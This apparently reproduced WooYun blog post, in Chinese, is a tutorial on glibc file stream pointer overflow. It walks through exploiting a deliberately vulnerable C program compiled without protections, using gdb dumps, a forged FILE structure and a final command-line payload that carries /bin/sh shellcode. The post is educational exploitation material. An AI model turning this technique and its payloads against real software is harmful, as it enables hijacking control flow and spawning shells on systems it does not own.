@@ -1,0 +1,100 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Head First FILE Stream Pointer Overflow</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">Ricter</a> <span class="bull">·</span> <time title="2016/02/25 11:36" ui-time="" datetime="2016/02/25 11:36" class="published ng-binding ng-isolate-scope">2016/02/25 11:36</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 前言</h1><hr><p>哄完女票睡觉后，自己辗转反侧许久还是睡不着，干脆爬起来写一下文件流指针（我这里简称 FSP）溢出攻击的笔记。FSP 溢出和栈溢出同样古老，但是 paper 却很少，我翻遍 Google 只发现三四篇文章，都会附在最后的 Reference 里面，学习学习涨涨姿势。</p><p>本文先讲述 FSP 溢出攻击的原理，以及边构造边利用的方式攻击了一个示例程序。</p><p>另外，因为我接触 pwnable 时间不久，经验不足，基础不牢，如果有错误的地方或理解失误的地方还请指出。</p><h1>0x01 介绍</h1><hr><p>许多种不安全的代码组合可以造成 FSP 溢出，比较明显的几种组合方式是： <code>strcpy() ,strcat() ,read() , ....</code> 和 <code>vfprintf(), fprintf(), fputc(), fputs()</code> 的组合。</p><p>FSP 溢出攻击通常是用户输入数据覆盖了文件流指针，导致我们可控文件流指针指向的 FILE 结构体（FILE struct）。FILE 结构体具体定义可以看<a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=libio/libio.h;h=bebc112a3bffc800cddbbd885663c2b3a33c1324;hb=4f2b767fef50f5f5c356c0c0e424fccc893a4ae6#l273">这里</a>，在此不再赘述。</p><p>控制了文件流指针后，可以构造合法的 FILE 结构体，最终在系统跳转至 <code>_IO_file_jumps</code> 的时候跳转到我们控制的地址，以控制 eip。</p><p>这张图是 FILE 结构体的构成图。</p><p><img alt="p1" img-src="af1573b2bf6de04270b3939dcb3b1a0e75ea4a75.jpg"></p><p>图片来源：<a href="https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/">https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/</a></p><p>下面分析一下一个常见的 FILE 结构体构成。</p><pre><code>#!bash
+gdb-peda$ x/40a stderr
+0xf7fbb980: 0xfbad2086  0x0 0x0 0x0
+0xf7fbb990: 0x0 0x0 0x0 0x0
+0xf7fbb9a0: 0x0 0x0 0x0 0x0
+0xf7fbb9b0: 0x0 0xf7fbba20  0x2 0x0
+0xf7fbb9c0: 0xffffffff  0x0 0xf7fbc8ac  0xffffffff
+0xf7fbb9d0: 0xffffffff  0x0 0xf7fbbb60  0x0
+0xf7fbb9e0: 0x0 0x0 0x0 0x0
+0xf7fbb9f0: 0x0 0x0 0x0 0x0
+0xf7fbba00: 0x0 0x0 0x0 0x0
+0xf7fbba10: 0x0 0xf7fbaa80 &lt;_IO_file_jumps&gt;  0x0 0x0
+</code></pre><p>这是 stderr 的 FILE 结构体，<code>_IO_file_jumps</code> 的地址是 <code>0xf7fbaa80</code>。</p><pre><code>#!bash
+gdb-peda$ x/21a 0xf7fbaa80
+0xf7fbaa80 &lt;_IO_file_jumps&gt;:    0x0 0x0 0xf7e86a70  0xf7e873e0
+0xf7fbaa90 &lt;_IO_file_jumps+16&gt;: 0xf7e871b0  0xf7e884d0  0xf7e89360  0xf7e86670
+0xf7fbaaa0 &lt;_IO_file_jumps+32&gt;: 0xf7e876c0  0xf7e85d00  0xf7e887a0  0xf7e863a0
+0xf7fbaab0 &lt;_IO_file_jumps+48&gt;: 0xf7e862b0  0xf7e7a1e0  0xf7e87610  0xf7e85c00
+0xf7fbaac0 &lt;_IO_file_jumps+64&gt;: 0xf7e87650  0xf7e85c90  0xf7e87690  0xf7e89500
+0xf7fbaad0 &lt;_IO_file_jumps+80&gt;: 0xf7e89510
+</code></pre><p>这就是 <code>_IO_file_jumps</code> 储存的要跳转到函数的地址了，比如：</p><pre><code>#!bash
+gdb-peda$ x/i 0xf7e86670
+   0xf7e86670 &lt;_IO_file_xsputn&gt;:    sub    esp,0x3c
+</code></pre><p>这个地址就是函数 <code>_IO_file_xsputn</code> 的地址。</p><h1>0x02 利用</h1><hr><p>大概聪明的你也应该想到利用方法了，我们能控制 FILE 指针的地址，那我们就可以自己构造一个假的 FILE struct，当然 <code>_IO_file_jumps</code> 也可以轻易的伪造。当各种文件处理函数跑到 <code>_IO_file_jumps</code> 寻找接下来该跳转的地址的时候，去我们伪造的 <code>_IO_file_jumps</code> 寻找指针，那么我们就可以控制 eip 执行 shellcode 了。</p><p>首先我们看一个示例程序（from: <a href="http://repo.hackerzvoice.net/depot_ouah/fsp-overflows.txt">http://repo.hackerzvoice.net/depot_ouah/fsp-overflows.txt</a>）：</p><pre><code>#!cpp
+/*
+ * file stream pointer overflow vulnerable program.c
+ * -killah
+ */
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+int main(int argc,char **argv)
+{
+   FILE *test;
+   char msg[]="no segfault yet\n";
+   char stage[1024];
+   if(argc&lt;2) {
+      printf("usage : %s &lt;argument&gt;\n",argv[0]);
+      exit(-1);
+   }
+   test=fopen("temp","a");
+   strcpy(stage,argv[1]);
+   fprintf(test,"%s",msg);
+   exit(0);
+}
+</code></pre><p>可以看到先用了 strcpy，再用了 fprintf，很经典的组合方式。</p><p>编译：</p><pre><code>#!bash
+cc -o fsp fsp.c -m32 -zexecstack -fno-stack-protector
+</code></pre><p>大概由于优化的原因，我这里 fprintf 被优化成了 fputs，不过没差，一样可以利用。</p><p>利用的第一步先寻找到溢出的偏移。</p><p>当我用<code>r $(python -c "print 'a'*1041 + 'AAAA'")</code>跑的时候，可以控制 ESI。</p><p><img alt="p2" img-src="cfb3060d3f789c6d67dac9b925132f8b77394b80.jpg"></p><p>如图，ESI 已经被控制成 0x41414141，那么这里就是我们控制的文件指针了。我们把整个文件结构体放在栈上， AAAA 的前面 160 个字节。AAAA 也改成指向文件指针开头的地方。</p><pre><code>#!bash
+gdb-peda$ searchmem AAAA
+Searching for 'AAAA' in: None ranges
+Found 3 results, display max 3 items:
+[stack] : 0xffffd364 ("AAAAR\345td]V\376\367\257\213", &lt;incomplete sequence \342&gt;...)
+[stack] : 0xffffd78c ("AAAA")
+[stack] : 0xffffdd95 ("AAAA")
+</code></pre><p>当前 AAAA 的地址为 0xffffd78c，减去 160 个字节后就是 0xffffd6ec。那么构造 payload：</p><pre><code>#!bash
+r $(python -c "print 'a'*881 + 'B'*160 + '\xec\xd6\xff\xff'")
+</code></pre><p><img alt="p3" img-src="1266a86e78c8e6dab11cff40caac7b1365196684.jpg"></p><p>报了新的错？没关系，take it easy，现在就开始构造 FILE struct 了。</p><p>我们知道 stderr 是一个标准的 FILE 结构体，那我们直接拿它的，在它的基础上改成我们需要的就好了。</p><pre><code>#!bash
+gdb-peda$ x/160bx stderr
+0xf7fbb980: 0x86    0x20    0xad    0xfb    0x00    0x00    0x00    0x00
+0xf7fbb988: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0xf7fbb990: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0xf7fbb998: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0xf7fbb9a0: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0xf7fbb9a8: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0xf7fbb9b0: 0x00    0x00    0x00    0x00    0x20    0xba    0xfb    0xf7
+0xf7fbb9b8: 0x02    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0xf7fbb9c0: 0xff    0xff    0xff    0xff    0x00    0x00    0x00    0x00
+0xf7fbb9c8: 0xac    0xc8    0xfb    0xf7    0xff    0xff    0xff    0xff
+0xf7fbb9d0: 0xff    0xff    0xff    0xff    0x00    0x00    0x00    0x00
+0xf7fbb9d8: 0x60    0xbb    0xfb    0xf7    0x00    0x00    0x00    0x00
+0xf7fbb9e0: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0xf7fbb9e8: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0xf7fbb9f0: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0xf7fbb9f8: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0xf7fbba00: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0xf7fbba08: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0xf7fbba10: 0x00    0x00    0x00    0x00    0x80    0xaa    0xfb    0xf7
+0xf7fbba18: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+</code></pre><p>经过处理后的到这么一长串：</p><pre><code>#!bash
+\x86\x20\xad\xfb\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\xba\xfb\xf7\x02\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00\xac\xc8\xfb\xf7\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x60\xbb\xfb\xf7\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\xaa\xfb\xf7\x00\x00\x00\x00\x00\x00\x00\x00
+</code></pre><p>但是我们知道，由于 strcpy 的缘故，并不能容忍 \x00 的存在，我们直接替换成 A 就好了，因为没报错..XD</p><pre><code>#!bash
+r "`python -c "print 'a'*881 + '\x86\x20\xad\xfbAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x20\xba\xfb\xf7\x02AAAAAAA\xff\xff\xff\xffAAAA\xac\xc8\xfb\xf7\xff\xff\xff\xff\xff\xff\xff\xffAAAA\x60\xbb\xfb\xf7AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x80\xaa\xfb\xf7AAAAAAAA' + '\xec\xd6\xff\xff'"`"
+</code></pre><p>拿去跑一下，看看有什么问题没有。</p><p><img alt="p4" img-src="84c836bac40c3dac6b09b96a0515b61ce935d4ce.jpg"></p><p>快看快看，我们到了最后 call 的地方了。</p><p>也就是说，程序运行到要从 <code>_IO_file_jumps</code> 取出指针，然后跳转了。但是遇到了一些小问题， eax 不符合预期。看一下上下文的汇编代码。</p><pre><code>#!bash
+0xf7e7b239 &lt;fputs+153&gt;: movzx  edx,BYTE PTR [esi+0x46]
+0xf7e7b23d &lt;fputs+157&gt;: movsx  edx,dl
+0xf7e7b240 &lt;fputs+160&gt;: mov    eax,DWORD PTR [esi+edx*1+0x94]
+0xf7e7b247 &lt;fputs+167&gt;: mov    DWORD PTR [esp+0x8],edi
+0xf7e7b24b &lt;fputs+171&gt;: mov    DWORD PTR [esp+0x4],ebp
+0xf7e7b24f &lt;fputs+175&gt;: mov    DWORD PTR [esp],esi
+0xf7e7b252 &lt;fputs+178&gt;: call   DWORD PTR [eax+0x1c]
+</code></pre><p>edx 是从 esi+0x46 处得来的一个字节的值，eax 是 esi+edx+0x94 处的值，最后 call eax+0x1c。</p><p>大体先看一下 esi+0x94 的样子：</p><pre><code>#!bash
+gdb-peda$ x/10w $esi+0x94
+0xffffd780: 0xf7fbaa80  0x41414141  0x41414141  0xffffd6ec
+0xffffd790: 0x08048500  0x00000000  0x00000000  0xf7e2f4d3
+0xffffd7a0: 0x00000002  0xffffd834
+</code></pre><p>0xffffd6ec 是我们控制的 FILE 结构体的地址，剩下的两处 0x41414141 正好可以用来写一些值来控制 eax。当 edx 为 0x4~0x8 的时候，正好在这 8 个字节的 0x41 的范围内。</p><p>我们让 esi+0x46 处为 8，然后第二处 0x41414141 指向 FILE 结构体前面的一块内存。</p><pre><code>#!bash
+r "`python -c "print 'a'*881 + '\x86\x20\xad\xfbAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x20\xba\xfb\xf7\x02AAAAAAA\xff\xff\xff\xffAA\x08A\xac\xc8\xfb\xf7\xff\xff\xff\xff\xff\xff\xff\xffAAAA\x60\xbb\xfb\xf7AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x80\xaa\xfb\xf7AAAA\xae\xd6\xff\xff' + '\xec\xd6\xff\xff'"`"
+</code></pre><p>我这里指向了 0xffffd63e 处，加上 0x1c 后（看上面汇编），为 0xffffd6ca。</p><p><img alt="p5" img-src="fc417f48f72bd9acf6e2f1b48d0ab7c177076160.jpg"></p><p>已经可以控制 eip 了，我们修改一下 0xffffd6ca 处的地址，使其指向 0xffffd6cf，然后 0xffffd6ce-0xffffd6ec 这 30 个字节上放上 shellcode。注意 shellcode 应该正好为 30 个字节，不能多也不能少，少了的话用 <code>\x90</code> 补充（根据实际情况来就好了）。</p><p>最终 payload：</p><pre><code>#!bash
+r "`python -c "print 'a'*847 + '\xcf\xd6\xff\xff' + '\x90'*9 + '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + '\x86\x20\xad\xfbAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x20\xba\xfb\xf7\x02AAAAAAA\xff\xff\xff\xffAA\x08A\xac\xc8\xfb\xf7\xff\xff\xff\xff\xff\xff\xff\xffAAAA\x60\xbb\xfb\xf7AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x80\xaa\xfb\xf7AAAA\xae\xd6\xff\xff' + '\xec\xd6\xff\xff'"`"
+</code></pre><p>执行效果： <img alt="p6" img-src="f074b6900d521833ad04c9e6a408763a35ca6ade.jpg"></p><h1>0x03 参考</h1><hr><ul><li><a href="http://repo.hackerzvoice.net/depot_ouah/fsp-overflows.txt">File Stream Pointer Overflows Paper</a></li><li><a href="https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/">abusing the FILE structure</a></li><li><a href="https://securimag.org/wp/news/buffer-overflow-exploitation/">BUFFER OVERFLOW EXPLOITATION</a></li></ul><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/papers/3771" rel="bookmark" id="re1">Reflected File Download Attack</a></li><li><a href="http://drops.wooyun.org/tips/1346" rel="bookmark" id="re2">Winrar4.x的文件欺骗漏洞利用脚本</a></li><li><a href="http://drops.wooyun.org/papers/4864" rel="bookmark" id="re3">PHP中的内存破坏漏洞利用（CVE-2014-8142和CVE-2015-0231）（连载之第一篇）</a></li><li><a href="http://drops.wooyun.org/tips/1376" rel="bookmark" id="re4">使用netcat进行反弹链接的shellcode</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">木马游民</span> <span class="reply-time">2016-02-29 15:55:02</span></div><p></p><p>刷乌云也要受到暴击</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">mrh</span> <span class="reply-time">2016-02-25 20:34:59</span></div><p></p><p>全文重点在第一个逗号之前：）</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">leakless</span> <span class="reply-time">2016-02-25 17:48:23</span></div><p></p><p>erevus神补刀</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">erevus</span> <span class="reply-time">2016-02-25 17:16:08</span></div><p></p><p>哄完panda睡觉？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">k0_pwn</span> <span class="reply-time">2016-02-25 17:15:54</span></div><p></p><p>看到女朋友三个字，作为二进制狗眼泪掉下来</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">pandada不哭</span> <span class="reply-time">2016-02-25 17:05:10</span></div><p></p><p>pandada不哭</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">dpanda</span> <span class="reply-time">2016-02-25 16:02:54</span></div><p></p><p>这么屌还有女票...Orz,楼下继续</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">dpanda</span> <span class="reply-time">2016-02-25 16:01:29</span></div><p></p><p>女朋友。。。</p><p></p></div></div></div></div></div></main>
